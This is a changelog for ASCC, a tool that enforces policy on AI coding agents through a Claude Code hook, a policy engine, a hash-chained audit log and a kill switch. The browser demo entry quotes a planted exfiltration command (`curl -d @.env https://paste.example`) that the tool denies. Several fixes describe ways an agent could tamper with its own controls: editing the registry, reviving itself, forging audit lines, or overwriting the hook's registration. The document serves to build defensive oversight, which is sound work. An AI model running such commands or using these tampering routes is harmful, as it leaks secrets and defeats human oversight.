<h1 align="center">📋 ASCC Changelog</h1>

<p align="center">
  <em>What changed in AI Security Command Center, newest first.</em>
</p>

<p align="center">
  <a href="ROADMAP.md"><img src="https://img.shields.io/badge/plan-ROADMAP-8B5CF6?style=for-the-badge" alt="Roadmap"></a>
  <a href="README.md"><img src="https://img.shields.io/badge/↩-docs-6B7280?style=for-the-badge" alt="Docs home"></a>
</p>

---

Entries that close a roadmap item carry the roadmap phase in italics.

## Unreleased

**Security**
- The full-history secret scan is clean again. `.gitleaks.toml` keeps gitleaks' default rules and allows, by value, only the planted fake credentials in `discover_test.go` and the fictional token and credential ids in the platform schema fixtures, 57 hits in all. It replaces `.gitleaksignore`, whose fingerprints covered one commit and missed the same lines in an earlier one. *Public release*

**Fixed**
- `ascc discover --out` and `ascc inventory --out` refuse a Claude Code settings file (project, local, user or managed, drop-ins included) and an MCP config. Pointed at one, a run replaced it, and with it the hook's registration, which a scheduled run would do every day. Found by the review of the Cronsole catalog. *Next slices*
- Two `ascc kill` or `ascc revive` commands at once could lose one: each read the registry, and the second to write put the first agent back. Both now hold the audit log's lock from the read to the audit line. *Next slices*
- `ascc-pdp` stops cleanly on the terminate signal `docker stop` sends, and lets requests in flight finish (up to five seconds) before it exits. It used to ignore that signal, and on Ctrl-C it returned without waiting. *Next slices*
- The development stack's rule test could be passed by a Compose file that broke its rules: a secret in a command, health check, label or build argument, a named volume bound to a host path, a Compose secret file, network driver options, an unpinned image named like a build stage or pulled in a `# syntax=` line or a `RUN --mount`, and more. Each is now refused, with a test that breaks it. Found by the security review of `deploy/compose/`, which found nothing wrong in the stack's own files. `dev-init.sh` also removes the file that briefly holds the OpenBao root token on every way out. *Next slices*

**Changed**
- The roadmap marks Slice 7 blocked: egress builds on ADR-08 and the broker on ADR-07, both still Spike, and the slice follows Slice 6, which waits on K5. *Next slices*
- The roadmap marks Slice 6 (the gateway) blocked on K5, as 5d and 5e are on the ADR sign-off: the gateway run met ADR-04's adopt rule, so a gateway built under the "build" default could be thrown away. Its status block says nothing is left that a run can build without an owner decision.
- Docs brought in line with the above: the README's folder table and `inventory` row, `CONTRIBUTING.md` (the three checks that run only when asked for), the `/checks` command, the `fail-closed-review` skill's test table, the threat model's T-20 row and the plan's next-steps entry for TKT-001.
- The demo's address in the README and docs is `https://ai-security-command-center-demo.ai-automation-tools.dev/`. The old one redirects there. *Next slices*
- `deploy/compose/README.md` asks for Docker Engine 28.3.3, not 28: the loopback fix it relies on was lost again after a firewalld reload until that release (CVE-2025-54388). *Next slices*
- The Pages workflow uses `actions/deploy-pages@v5` and `actions/upload-pages-artifact@v5`. *Next slices*

**Added**
- A Cronsole template catalog: four unattended `ascc` runs (the audit log's chain hourly, the hook's posture daily, discovery of unregistered agents weekly, the inventory daily), each linked from the README's "Schedule it with Cronsole" section. `go run ./src/cmd/buildregistry` writes it to `registry/` as Registry v1 with a sha256 index; `go test ./...` and a CI step fail when it is stale or a template runs anything but a documented `ascc` command. A workflow mirrors it to the homepage host and a daily one checks the hosted copy; neither can publish until the site repo's deploy key is added. *Next slices*
- A browser test for the demo page. `TestBuiltPageInABrowser` drives the built page in headless Chromium through Playwright: the planted deny on first load, then replay, a policy edit, the kill switch and a tampered log. Every request the page makes is stopped inside the browser and anything but the site's own seven files fails the test, as does any console error. It runs in a CI job of its own and skips locally unless `ASCC_BROWSER_TEST` is set. *Next slices*
- `ascc inventory --import` warns on stderr when two imported files describe one id differently. It names the id and both files and nothing else; the first file still wins. *Next slices*
- The gateway run. agentgateway v1.7.0 was run between a stub MCP server and a stub `ext_mcp` policy service, by a harness in `src/spikes/gatewayrun/` (a Go module of its own, with a CI job that checks the release's SHA-256 before running it). A deny reached the client with its reason, `tools/list` was filtered per agent, a call was refused with the policy service down, a changed tool description was rejected against its pin, and the gateway with its callouts added about 1.4 ms a call. One result went the other way: a deny doesn't end a stream that is already open. The [gateway report](reports/2026-gateway-build-vs-adopt.md#the-run-2026-11-11) has the table and ADR-04 an amendment; build or adopt (K5) is still the owner's call. *Next slices*
- A development stack in `deploy/compose/`: one `docker compose` command starts Postgres, Keycloak with an `ascc-dev` realm, OpenBao (unsealed and initialised with no step by hand), Jaeger, `ascc-pdp` on the sample policies, and an egress proxy placeholder that refuses everything. Every port is on `127.0.0.1`, every image is pinned by digest, and every secret comes from `.env`, so none is in the repository and a missing one stops the start. For one developer's machine only. *Next slices*
- `ascc-pdp`, the policy decision point as a service: `POST /pdp/v1/decide` gives the same answer as `ascc decide`, in the platform's request and response shape. It listens on loopback, re-reads the registry and policies on every request so the kill switch needs no restart, and answers a deny for anything it can't evaluate or can't log. It doesn't authenticate callers or keep an audit chain yet. Guide: `docs/guides/pdp-service.md`. *Next slices*
- Platform schemas. `schemas/platform/v1alpha1/` has JSON Schemas for the registry entities, relationship edges, the event envelope, the transaction and plugin capability tokens' claims, the plugin manifest and the PDP request and response, each with valid and invalid fixtures the tests run. `ascc-schema validate --schema <name> <file>` checks a document against one: it is a binary of its own, loads nothing from outside the schema file, refuses duplicate keys and input over 1 MiB, and never prints a value from the document. *Next slices*
- Slice 4, the Phase 0 spikes. Three reports in `docs/reports/`: the gateway (agentgateway passes four of ADR-04's five criteria on a source read; nothing was run), proof of possession (DPoP where ASCC writes the client, a client certificate for Claude Code, and no binding yet for its remote MCP token) and the plugin contract. A prototype plugin host in `src/spikes/pluginhost/`, a Go module of its own: the `v1alpha1` gRPC contract with generated reference, a Go SDK skeleton and a hello connector that runs as a separate process, is refused a call outside its grant, and whose events carry its id. ADR-01 to ADR-17 each carry a status with its evidence and what it waits for (two Accepted, fifteen still Spike until the owner signs off), nine are amended, and the threat model is re-rated in D §4.1. CI vets and tests the prototype. *Next slices*
- The plan's [V] items checked against their sources, with a row each in `docs/product/plan/k-next-steps.md` §1.1. Nine had changed, among them the MCP 2026-07-28 revision (sessions and server-initiated requests removed, no new transport auth), Envoy AI Gateway's rename to Agent Router, GitHub's App-only PAT endpoints and cosign's offline flags. No ADR is amended yet; the Slice 4 spikes do that. *Next slices*
- `CONTRIBUTING.md`: how to run the checks and add a policy with its allow and deny fixtures. *Publish and promote*
- README section "The rest of the suite" linking mcp-frisk, mcp-tool-rugpull-gate and scope-drift-trimmer: they inspect and inventory, ASCC enforces. *Publish and promote*
- `.github/workflows/pages.yml` builds the browser demo and publishes it to GitHub Pages on every push to `main`, stamping the commit into the page's build tag. It publishes nothing unless the page test passes. The README has a Live Demo badge. The demo is live at `https://ai-automation-tools.dev/ai-security-command-center/`. *Public release*
- CI checks the inventory: `ascc inventory` on `examples/` must validate against the suite schema and report the planted ownerless agent, and the vendored schema must match the one published at `ai-automation-tools.dev`.
- Browser demo. `site/index.html` runs ascc as WebAssembly on the sample registry, policies and five planted tool calls: the injected `curl -d @.env https://paste.example` shows as denied with its policy and reason on first load, and the visitor can edit the policy, replay calls, watch the audit chain grow, edit a line and see verify fail, and flip the kill switch. `go run ./src/cmd/buildsite` writes it to `_site/`. The page makes no network call: the WebAssembly is embedded in a script, fonts are the system's, and a content policy sets `connect-src 'none'`. A test runs the built page in Node with `fetch`, `XMLHttpRequest` and the other ways out stubbed to throw. *Slice 3: Browser demo*
- Three more sample hook payloads in `examples/hook-payloads/`: a push to `main`, an edit to the hook registration in `.claude/settings.json` and a test run.
- Non-human identities. `ascc.registry.json` takes an `identities` list (service accounts, bots, CI jobs, OAuth apps, MCP servers, written as the suite schema writes them, plus a `rotateBy` date on a credential) and a `uses` list on each agent. `ascc inventory` writes them after the agents with four findings: `ascc/nhi-no-owner`, `ascc/nhi-credential-overdue`, `ascc/nhi-unlinked` and `ascc/nhi-used-by-suspended-agent`. `ascc inventory --import <file>` (repeatable) merges the identities of another suite tool's document or a `discover` report, never duplicating an id and never letting an imported file set a coverage label. `ascc kill <agent>` prints the identities that agent uses, to rotate or revoke by hand. The sample registry plants one of each problem. *Slice 2b: Fleet and NHI inventory*
- `ascc discover [--root <dir>] [--out <file>]` searches a folder for the agent config files it knows (Claude Code settings, `.mcp.json`, `.claude.json`, `managed-settings.json`, `managed-mcp.json`; the list and its version are in the code and in the document) and writes an inventory document of what the registry doesn't list: a Claude Code setup with no ascc hook, a hook for an unregistered agent, and an MCP server none of whose tools is listed, each `unmonitored` with an `ascc/unregistered` finding. Credential-looking variable and header names in an MCP server's config become candidate identities. Only names are read, never a value; a file it can't read is named on stderr and the exit code is 1. *Slice 2b: Fleet and NHI inventory*
- `ascc posture claude-code [--agent <id>]` reads the Claude Code settings files (`--managed`, `--user`, `--project`, and `managed-settings.d` drop-ins) and never writes them. An agent passes only when its hook is registered in managed settings in exec form with matcher `*` and `"onFailure": "block"`, nothing switches hooks off, and the binary is there; each failure names its reason, and a settings file ascc can't read is a failure. Exit 1 when any agent fails. *Slice 2b: Fleet and NHI inventory*
- `ascc inventory` computes each agent's coverage label from evidence: `unmonitored` with no tool-call decision for it in an audit log that verifies, `observed` with one but no passing posture check, `enforced` only with both. *Slice 2b: Fleet and NHI inventory*
- `ascc hook claude-code --agent <id>`: a Claude Code PreToolUse hook. It maps each tool call to a request (`path_in_repo`, `network`, `touches_secret_path`, `touches_ascc_state`, `git_push_target`, with `Bash` and `PowerShell` parsed alike and Windows paths normalised), blocks a policy deny with exit 0 and the deny JSON, prints nothing on an allow, and exits 2 on anything it can't do, which also blocks. Checked against a live Claude Code 2.1.321 session. *Slice 2: Enforce and record*
- Hash-chained audit log (`.ascc/audit.jsonl`): one line per decision with the policy ids, the parsed features and a SHA-256 of the hook payload, never the payload. Appends take a lock, so twenty parallel hooks leave one chain; a call that can't be recorded is blocked. `ascc audit verify` names the first edited, removed or reordered line and exits 1, and `--expect-head <hash>` catches lines cut off the end. *Slice 2: Enforce and record*
- `ascc kill <agent>` and `ascc revive <agent>` flip the registry status and are recorded. A retired agent can't be revived. *Slice 2: Enforce and record*
- `deny-ascc-state-changes` sample policy and the `touches_ascc_state` context feature: an agent can't write the registry, a policy, the audit log or a Claude Code settings file, or run `ascc kill` or `revive`.
- `docs/guides/claude-code-setup.md`: the settings snippet (matcher `*`, `"onFailure": "block"`, timeout 10), a check by hand, the audit log, the kill switch and a table of what the hook doesn't cover.
- A test that the `ascc` binary links no package that can open a socket, and a CI step that builds the `pdp`, `audit` and `claudecode` packages for WebAssembly.
- Policy decision point (`src/internal/pdp`) on cedar-go v1.9.0. `ascc decide --request <file|->` answers with `decision`, the determining `policy_ids` and a plain-English `reason` taken from each policy's `@reason`. Default deny, and denied before any policy runs: an agent or tool that isn't in the registry, a suspended or retired agent, a context that doesn't fit the built-in schema. A policy that errors while evaluating is a deny naming it. A registry typo, a policy with no `@id` or a duplicate one, or a policy that doesn't type-check against the schema stops ascc loading. *Slice 1: Policy decision point*
- `ascc inventory` writes the registry as an Agent Security Suite inventory document (schema v0.1, vendored to `schemas/`), with findings `ascc/no-owner`, `ascc/no-policy` and `ascc/suspended`. Every agent is labelled `unmonitored` until the hook and the posture check give evidence for more. *Slice 1: Policy decision point*
- Agent groups (`groups` in the registry become Cedar parents, so `principal in AgentGroup::"developers"` covers a team) and the `retired` status, both from the requirements review.
- `examples/`: a sample registry, six policies and three requests with fictional agents. The policies permit Claude Code's internal tools so default deny under matcher `*` won't stall a session.

**Changed**
- A deny for a request whose context doesn't fit the schema no longer repeats the context: the reason printed every value in it, and that reason goes to the audit log and back to the agent. The reason for a context value of the wrong kind no longer names the attribute.
- A policy file with no policy in it now stops the load (so every call is denied until it is fixed or removed). It used to load as nothing, which dropped that file's rules in silence.
- `AGENTS.md`: the zero-network rule now names what it protects, the `ascc` binary and the demo. The platform services from Slice 5 on are binaries of their own and may use the network. Slice 5 on the roadmap is split into five items.
- `ascc discover` no longer reports an MCP server or a candidate credential that the registry declares as an active identity under the same id.
- `ascc inventory` refuses a stray argument instead of ignoring it.
- `--out` on `inventory` and `discover` refuses to write over the registry, the audit log or anything in the policies folder.
- `touches_ascc_state` now also covers `ascc hook` run from a shell, which could forge the audit lines the coverage label is computed from, and writes to `managed-settings.d` drop-in files.
- `ascc hook claude-code` exits 2, blocking the call, when its registration carries a stray argument: Go's flag parsing would otherwise drop every flag after it, `--agent` included.
- Every request context now needs `touches_ascc_state`; the sample requests carry it. `deny-push-to-main` also forbids a push to every branch at once (`--all`, `--mirror`, several refspecs).
- Go 1.26, which cedar-go v1.9.0 requires. Two dependencies: cedar-go, and `santhosh-tekuri/jsonschema/v6` for the test that validates the inventory against the suite schema.
- `ascc` with no arguments prints usage and exits 2; the version moved to `ascc version`.
- A suspended agent is denied by the PDP itself, not by a `deny-suspended-agent` sample policy as the cedar-go check sketched, so deleting a rule can't undo the kill switch.

**Docs**
- Roadmap rechecked against the org's 2026-11 requirements: the intro names the roadmap routine instead of its days, 5d and 5e are marked blocked on the ADR sign-off, the Slice 5 umbrella is open rather than claimed, and four items after the gateway run turn the known loose ends into work (the new demo URL with HTTPS enforced, `small` loose ends, a hardening pass, a browser page test).
- The roadmap opens with "Where things stand": every release gate ticked, the repo kept private for now, the next item for a run and the known loose ends.
- The docs index lists the browser demo, the setup guide names all five sample hook payloads, and the reviewer agent and the skills that list the core packages and the WebAssembly build now include `demo` and `ascc-wasm`.
- README: an install line, a table of every command, flag and exit code, a sample run with output from a fresh build, a coverage section on what the hook sees and doesn't, the Won't list as the spec states it, and a responsible-use section.
- The README quick start, the docs index and the threat-trace skill now cover `posture` and `discover`.
- The roadmap and build plan now carry the requirements review: the four hardening rules are part of the Slice 2 item, and a new Slice 2b (fleet and NHI inventory: `posture`, `discover`, declared and imported identities) sits above the release line.
- Requirements review against the stated purpose (enterprise agent management, and governing non-human accounts including AI agents). The public-MVP spec gains a fourth feature, an offline fleet and NHI inventory (`posture`, `discover`, declared and imported identities), plus agent groups, a `retired` status, a computed coverage label and criteria 9 to 17.
- The same review found three holes in the MVP as specified and closed them in the spec: an agent could edit the registry or run `ascc revive` on itself, parallel hooks could fork the audit chain, and lines cut from the end of the log still verified.
- Planning package v0.3: epic EP-24 (agent fleet management), FR-REG-12 to 15, FR-POL-11, FR-RT-05 to 07, FR-KS-08, FR-CON-15 to 18, threat T-28, abuse cases ABUSE-33 and 34, tickets TKT-041 and 042.
- `AGENTS.md` carries the two reports' rules: cedar-go v1.9.0 and the Go 1.26 bump it brings, the fail-closed handling of erroring policies, and the hook contract. *Slice 0: Contracts*
- Claude Code hook contract (`docs/reports/2026-claude-code-hook-contract.md`): the PreToolUse payload, the deny JSON and exit codes, the fail-open defaults and `"onFailure": "block"` (v2.1.295+), the coverage gaps (`@` mentions, Monitor, `PowerShell`, editable settings), and seven rules for Slice 2. *Slice 0: Contracts*
- cedar-go check (`docs/reports/2026-cedar-go-check.md`): cedar-go v1.9.0 matched the Rust reference engine on 9 of 9 requests and on schema validation, at about 1.3 µs per decision. It needs Go 1.26, and in both engines a `forbid` that errors on a missing attribute fails open, so Slice 1 now carries four fail-closed rules. *Slice 0: Contracts*

## 2026-11-09

**Added**
- Repo scaffold: a Go module with the `ascc` CLI (`src/cmd/ascc`) that prints its version, with `gofmt`, `go vet`, `go test` and `go build` all passing, an MIT licence, and an `.env.example` that says there are no settings.
- CI on push to `main` and on every PR, on Ubuntu and Windows: format, vet, test and build. *Public release*
- `SECURITY.md` with private reporting through GitHub, and what counts as a vulnerability for a tool whose worst bug is a wrong allow. *Public release*
- Demo shell in `site/`: the org source bar, a build-stamp meta tag, a "coming soon" body, and the app icon (a violet hexagon with a check on the shared dark tile) as its favicon. *Public release*

**Docs**
- Root README, `AGENTS.md`, the docs hub, this changelog, and a roadmap that puts Slices 0 to 3 of the build plan above the release line.
- The combined planning package (A to K) copied from the private planning workspace into `docs/product/plan/` with lowercase file names, and the resource library into `docs/resources/`. The two source runs, the idea analysis and the market notes stay private.
- A public-MVP spec and build plan cut from the plan's MVP: one Go binary, one runtime, local files.
- A full-history secret scan came back clean. *Public release*

---

<p align="center">
  <a href="README.md">← Docs home</a> ·
  <a href="ROADMAP.md">Roadmap →</a>
</p>
